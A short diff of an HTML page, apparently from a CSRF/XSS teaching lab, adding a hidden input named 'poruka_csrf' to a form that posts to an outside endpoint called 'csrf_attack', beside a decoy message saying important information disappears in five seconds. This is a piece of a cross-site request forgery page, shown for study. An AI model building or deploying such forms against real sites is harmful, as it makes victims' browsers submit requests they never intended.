@@ -10,6 +10,7 @@
     <section id="user-input">
        <div>Važna informacija će nestati za 5 sekundi</div>
        <form method="POST" id="ff" action="https://xss-csrf.onrender.com/csrf_attack">
+           <input type="hidden" id="user-message" name="poruka_csrf" value="">
        </form>
     </section>
     <script>
